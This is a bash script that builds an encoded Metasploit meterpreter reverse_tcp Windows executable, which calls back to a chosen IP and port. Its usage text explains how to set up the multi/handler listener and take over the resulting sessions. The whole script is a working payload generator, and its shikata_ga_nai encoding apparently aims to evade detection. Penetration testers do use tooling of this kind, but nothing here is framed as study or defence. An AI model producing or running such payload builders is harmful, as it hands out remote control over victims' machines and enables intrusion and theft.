#!/bin/bash
ShowUsage() {
	echo "Usage: $0 <IP For Payload to Connect To> <port for payload to connect to> <output file name>"
	echo ""
	echo -n "$0 will generate a metasploit meterpreter Windows executable with the specified output file name and "
	echo "encode it to connect back to the specified IP address and port."
	echo ""
	echo "To set up the multi/handler:"
	echo "Run msfconsole"
	echo "use exploit/multi/handler"
	echo "set payload windows/meterpreter/reverse_tcp"
	echo "set LHOST <local IP>"
	echo "set LPORT <local listening port (specified in payload)"
	echo "exploit -j"
	echo ""
	echo "The use:"
	echo "'sessions -l' to list active sessions"
	echo "'sessions -i <#>' to interact"
	echo ""

}

if [ $# -lt 3 ]; then
	ShowUsage
	exit 1
fi

IPADDR=$1
PORT=$2
OUTPUTFILE=$3

/opt/metasploit/app/msfpayload windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$PORT R | /opt/metasploit/app/msfencode -t exe -e x86/shikata_ga_nai -o $OUTPUTFILE -c 1

